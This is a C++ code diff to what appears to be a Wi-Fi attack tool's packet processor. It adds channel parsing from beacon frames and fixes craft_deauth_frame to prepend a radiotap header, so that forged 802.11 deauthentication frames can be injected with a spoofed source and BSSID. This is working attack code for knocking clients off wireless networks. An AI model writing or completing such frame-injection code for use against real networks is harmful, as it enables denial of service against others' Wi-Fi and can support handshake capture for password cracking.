@@ -158,18 +158,24 @@ bool PacketProcessor::parse_beacon(const uint8_t* packet, int len, WiFiNetwork& 
     int tags_len = len - 36;
     
     bool found_ssid = false;
+    bool found_channel = false;
     bool is_wpa2 = false;
-    
+
     int offset = 0;
     while (offset + 2 <= tags_len) {
         uint8_t tag_num = tags[offset];
         uint8_t tag_len = tags[offset + 1];
-        
+
         if (offset + 2 + tag_len > tags_len) break;
-        
+
         if (tag_num == 0) { // SSID
             net.ssid = std::string((char*)(tags + offset + 2), tag_len);
             found_ssid = true;
+        } else if (tag_num == 3) { // DS Parameter Set (real channel)
+            if (tag_len >= 1) {
+                net.channel = tags[offset + 2];
+                found_channel = true;
+            }
         } else if (tag_num == 48) { // RSN Information (WPA2)
             const uint8_t* rsn = tags + offset + 2;
             if (tag_len >= 12) {
@@ -495,32 +501,44 @@ void PacketProcessor::extract_addresses(const uint8_t* packet, int len,
 std::vector<uint8_t> PacketProcessor::craft_deauth_frame(const uint8_t* src_mac,
                                                          const uint8_t* dst_mac,
                                                          const uint8_t* bssid) {
-    std::vector<uint8_t> frame(26);
+    // Radiotap header (8 bytes) + 802.11 deauth frame (26 bytes) = 34 bytes total
+    std::vector<uint8_t> frame(34);
 
+    // Radiotap Header (8 bytes) - minimal header for injection
+    frame[0] = 0x00;  // Version 0
+    frame[1] = 0x00;  // Padding
+    frame[2] = 0x08;  // Header length (8 bytes, little-endian)
+    frame[3] = 0x00;  // Header length high byte
+    frame[4] = 0x00;  // Present flags - no fields, use driver defaults
+    frame[5] = 0x00;
+    frame[6] = 0x00;
+    frame[7] = 0x00;
+
+    // 802.11 Deauth Frame starts at offset 8
     // Frame Control: Deauthentication (0xC0 0x00)
-    frame[0] = 0xC0;
-    frame[1] = 0x00;
+    frame[8] = 0xC0;
+    frame[9] = 0x00;
 
     // Duration
-    frame[2] = 0x3A;
-    frame[3] = 0x01;
+    frame[10] = 0x3A;
+    frame[11] = 0x01;
 
     // Address 1: Destination
-    memcpy(&frame[4], dst_mac, 6);
+    memcpy(&frame[12], dst_mac, 6);
 
     // Address 2: Source
-    memcpy(&frame[10], src_mac, 6);
+    memcpy(&frame[18], src_mac, 6);
 
     // Address 3: BSSID (MUST always be AP's BSSID per 802.11 standard)
-    memcpy(&frame[16], bssid, 6);
+    memcpy(&frame[24], bssid, 6);
 
     // Sequence control (will be filled by driver)
-    frame[22] = 0x00;
-    frame[23] = 0x00;
+    frame[30] = 0x00;
+    frame[31] = 0x00;
 
     // Reason code: Class 3 frame from non-associated STA (0x07)
-    frame[24] = 0x07;
-    frame[25] = 0x00;
+    frame[32] = 0x07;
+    frame[33] = 0x00;
 
     return frame;
 }
